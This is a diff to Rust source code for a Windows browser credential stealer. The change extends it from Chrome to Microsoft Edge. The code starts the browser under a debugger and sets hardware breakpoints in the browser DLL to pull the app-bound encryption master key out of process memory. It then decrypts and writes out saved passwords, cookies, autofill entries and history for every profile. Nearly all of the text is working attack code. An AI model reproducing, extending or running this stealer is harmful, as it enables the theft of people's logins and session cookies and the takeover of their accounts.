@@ -16,6 +16,15 @@ use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 use rusqlite::{Connection};
 use chrono::{Utc};
 
+struct BrowserConfig {
+    name: &'static str,
+    exe_paths: &'static [&'static str],
+    dll_name: &'static str,
+    user_data_subdir: &'static [&'static str],
+    output_dir: &'static str,
+    temp_prefix: &'static str,
+}
+
 // Some missing definitions from windows-sys that might be architecture specific or in other modules
 #[repr(C)]
 #[derive(Copy, Clone)]
@@ -263,45 +272,98 @@ extern "system" {
 }
 
 fn main() {
-    unsafe {
-        let mut si: STARTUPINFOW = zeroed();
-        si.cb = size_of::<STARTUPINFOW>() as u32;
-        let mut pi: PROCESS_INFORMATION = zeroed();
+    let configs = vec![
+        BrowserConfig {
+            name: "Google Chrome",
+            exe_paths: &[
+                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+                "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
+            ],
+            dll_name: "chrome.dll",
+            user_data_subdir: &["Google", "Chrome", "User Data"],
+            output_dir: "chrome_extract",
+            temp_prefix: "chrome_tmp",
+        },
+        BrowserConfig {
+            name: "Microsoft Edge",
+            exe_paths: &[
+                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+                "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
+            ],
+            dll_name: "msedge.dll",
+            user_data_subdir: &["Microsoft", "Edge", "User Data"],
+            output_dir: "edge_extract",
+            temp_prefix: "edge_tmp",
+        },
+    ];
 
-        let mut chrome_cmd: Vec<u16> = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-first-run --no-default-browser-check\0"
-            .encode_utf16()
-            .collect();
+    for config in configs {
+        let user_data_dir = match get_user_data_dir(config.user_data_subdir) {
+            Some(d) => d,
+            None => {
+                println!("User data directory not found for {}, skipping...", config.name);
+                continue;
+            }
+        };
 
-        let success = CreateProcessW(
-            null(),
-            chrome_cmd.as_mut_ptr(),
-            null(),
-            null(),
-            FALSE,
-            DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,
-            null(),
-            null(),
-            &si,
-            &mut pi,
-        );
-
-        if success == 0 {
-            eprintln!("Failed to create Chrome process: {}", GetLastError());
-            return;
+        let mut exe_path = None;
+        for path in config.exe_paths {
+            if Path::new(path).exists() {
+                exe_path = Some(*path);
+                break;
+            }
         }
 
-        println!("Started Chrome with PID: {}", pi.dwProcessId);
+        let exe_path = match exe_path {
+            Some(p) => p,
+            None => {
+                println!("Executable not found for {}, skipping...", config.name);
+                continue;
+            }
+        };
 
-        debug_loop(pi.hProcess);
+        println!("Processing {}...", config.name);
 
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        unsafe {
+            let mut si: STARTUPINFOW = zeroed();
+            si.cb = size_of::<STARTUPINFOW>() as u32;
+            let mut pi: PROCESS_INFORMATION = zeroed();
+
+            let mut cmd_line: Vec<u16> = format!("\"{}\" --no-first-run --no-default-browser-check\0", exe_path)
+                .encode_utf16()
+                .collect();
+
+            let success = CreateProcessW(
+                null(),
+                cmd_line.as_mut_ptr(),
+                null(),
+                null(),
+                FALSE,
+                DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,
+                null(),
+                null(),
+                &si,
+                &mut pi,
+            );
+
+            if success == 0 {
+                eprintln!("Failed to create {} process: {}", config.name, GetLastError());
+                continue;
+            }
+
+            println!("Started {} with PID: {}", config.name, pi.dwProcessId);
+
+            debug_loop(pi.hProcess, &config, &user_data_dir);
+
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
     }
 }
 
-unsafe fn debug_loop(h_process: HANDLE) {
+unsafe fn debug_loop(h_process: HANDLE, config: &BrowserConfig, user_data_dir: &Path) {
     let mut debug_event: DEBUG_EVENT = zeroed();
-    let mut _chrome_dll_base: *mut std::ffi::c_void = null_mut();
+    let mut _dll_base: *mut std::ffi::c_void = null_mut();
     let mut target_address: usize = 0;
 
     loop {
@@ -316,10 +378,10 @@ unsafe fn debug_loop(h_process: HANDLE) {
                 let len = GetFinalPathNameByHandleW(load_dll.hFile, buffer.as_mut_ptr(), buffer.len() as u32, 0);
                 if len > 0 {
                     let path = String::from_utf16_lossy(&buffer[..len as usize]);
-                    if path.contains("chrome.dll") {
-                        println!("Found chrome.dll at {:?}", load_dll.lpBaseOfDll);
-                        _chrome_dll_base = load_dll.lpBaseOfDll;
-                        target_address = find_target_address(h_process, _chrome_dll_base);
+                    if path.contains(config.dll_name) {
+                        println!("Found {} at {:?}", config.dll_name, load_dll.lpBaseOfDll);
+                        _dll_base = load_dll.lpBaseOfDll;
+                        target_address = find_target_address(h_process, _dll_base);
                         if target_address != 0 {
                             let threads = get_all_threads(debug_event.dwProcessId);
                             println!("Setting hardware breakpoints on {} threads", threads.len());
@@ -340,7 +402,7 @@ unsafe fn debug_loop(h_process: HANDLE) {
                 if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
                     if exception.ExceptionRecord.ExceptionAddress as usize == target_address {
                         println!("Target breakpoint hit!");
-                        if extract_key(debug_event.dwThreadId, h_process) {
+                        if extract_key(debug_event.dwThreadId, h_process, config, user_data_dir) {
                             clear_hardware_breakpoints(debug_event.dwProcessId);
                             TerminateProcess(h_process, 0);
                         }
@@ -515,8 +577,8 @@ unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
     CloseHandle(h_thread);
 }
 
-fn get_v10_key() -> Option<[u8; 32]> {
-    let local_state_path = get_user_data_dir()?.join("Local State");
+fn get_v10_key(user_data_dir: &Path) -> Option<[u8; 32]> {
+    let local_state_path = user_data_dir.join("Local State");
     let content = fs::read_to_string(&local_state_path).ok()?;
     let json: serde_json::Value = serde_json::from_str(&content).ok()?;
     let encrypted_key_b64 = json["os_crypt"]["encrypted_key"].as_str()?;
@@ -565,12 +627,12 @@ fn base64_decode(input: &str) -> Option<Vec<u8>> {
     None
 }
 
-fn get_user_data_dir() -> Option<PathBuf> {
+fn get_user_data_dir(subdir: &[&str]) -> Option<PathBuf> {
     let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
-    let path = Path::new(&local_app_data)
-        .join("Google")
-        .join("Chrome")
-        .join("User Data");
+    let mut path = PathBuf::from(local_app_data);
+    for component in subdir {
+        path.push(component);
+    }
     if path.exists() {
         Some(path)
     } else {
@@ -640,8 +702,8 @@ fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<
     None
 }
 
-fn copy_and_open_db(db_path: &Path) -> Option<(Connection, PathBuf)> {
-    let temp_db = std::env::temp_dir().join(format!("chrome_tmp_{}", rand::random::<u32>()));
+fn copy_and_open_db(db_path: &Path, prefix: &str) -> Option<(Connection, PathBuf)> {
+    let temp_db = std::env::temp_dir().join(format!("{}_{}", prefix, rand::random::<u32>()));
     if let Err(_) = fs::copy(db_path, &temp_db) {
         return None;
     }
@@ -655,11 +717,11 @@ fn copy_and_open_db(db_path: &Path) -> Option<(Connection, PathBuf)> {
     }
 }
 
-fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>) {
+fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str) {
     let db_path = profile_path.join("Login Data");
     if !db_path.exists() { return; }
 
-    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+    if let Some((conn, temp_path)) = copy_and_open_db(&db_path, temp_prefix) {
         if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
             let mut file = fs::File::create(output_dir.join("passwords.txt")).unwrap();
             let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?))).unwrap();
@@ -675,14 +737,14 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<
     }
 }
 
-fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>) {
+fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str) {
     let mut db_path = profile_path.join("Network").join("Cookies");
     if !db_path.exists() {
         db_path = profile_path.join("Cookies");
     }
     if !db_path.exists() { return; }
 
-    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+    if let Some((conn, temp_path)) = copy_and_open_db(&db_path, temp_prefix) {
         if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, value, encrypted_value FROM cookies") {
             let mut file = fs::File::create(output_dir.join("cookies.txt")).unwrap();
             let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, String>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();
@@ -706,11 +768,11 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&A
     }
 }
 
-fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>) {
+fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str) {
     let db_path = profile_path.join("Web Data");
     if !db_path.exists() { return; }
 
-    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+    if let Some((conn, temp_path)) = copy_and_open_db(&db_path, temp_prefix) {
         let mut file = fs::File::create(output_dir.join("autofill.txt")).unwrap();
 
         // Form History
@@ -746,11 +808,11 @@ fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&
     }
 }
 
-fn extract_history(profile_path: &Path, output_dir: &Path) {
+fn extract_history(profile_path: &Path, output_dir: &Path, temp_prefix: &str) {
     let db_path = profile_path.join("History");
     if !db_path.exists() { return; }
 
-    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+    if let Some((conn, temp_path)) = copy_and_open_db(&db_path, temp_prefix) {
         if let Ok(mut stmt) = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100") {
             let mut file = fs::File::create(output_dir.join("history.txt")).unwrap();
             let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, i32>(2)?, row.get::<_, i64>(3)?))).unwrap();
@@ -766,18 +828,13 @@ fn extract_history(profile_path: &Path, output_dir: &Path) {
     }
 }
 
-fn extract_all_profiles_data(v20_key: &[u8; 32]) {
-    let user_data_dir = match get_user_data_dir() {
-        Some(d) => d,
-        None => return,
-    };
-
-    let v10_key = get_v10_key();
+fn extract_all_profiles_data(v20_key: &[u8; 32], config: &BrowserConfig, user_data_dir: &Path) {
+    let v10_key = get_v10_key(user_data_dir);
     let v10_cipher = v10_key.as_ref().map(|k| Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(k)));
     let v20_cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(v20_key));
 
-    let profiles = discover_profiles(&user_data_dir);
-    let extract_root = Path::new("chrome_extract");
+    let profiles = discover_profiles(user_data_dir);
+    let extract_root = Path::new(config.output_dir);
     let _ = fs::create_dir_all(extract_root);
 
     for profile_name in profiles {
@@ -786,15 +843,15 @@ fn extract_all_profiles_data(v20_key: &[u8; 32]) {
         let output_dir = extract_root.join(&profile_name);
         let _ = fs::create_dir_all(&output_dir);
 
-        extract_passwords(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher));
-        extract_cookies(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher));
-        extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher));
-        extract_history(&profile_path, &output_dir);
+        extract_passwords(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher), config.temp_prefix);
+        extract_cookies(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher), config.temp_prefix);
+        extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher), config.temp_prefix);
+        extract_history(&profile_path, &output_dir, config.temp_prefix);
     }
-    println!("Extraction complete. Data saved in chrome_extract folder.");
+    println!("Extraction complete. Data saved in {} folder.", config.output_dir);
 }
 
-unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
+unsafe fn extract_key(thread_id: u32, h_process: HANDLE, config: &BrowserConfig, user_data_dir: &Path) -> bool {
     let h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id);
     if h_thread == 0 {
         return false;
@@ -820,7 +877,7 @@ unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
                 if ReadProcessMemory(h_process, data_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
                     if key.iter().any(|&b| b != 0) {
                         println!("Extracted Master Key from 0x{:X}", data_ptr);
-                        extract_all_profiles_data(&key);
+                        extract_all_profiles_data(&key, config, user_data_dir);
                         success = true;
                         break;
                     }
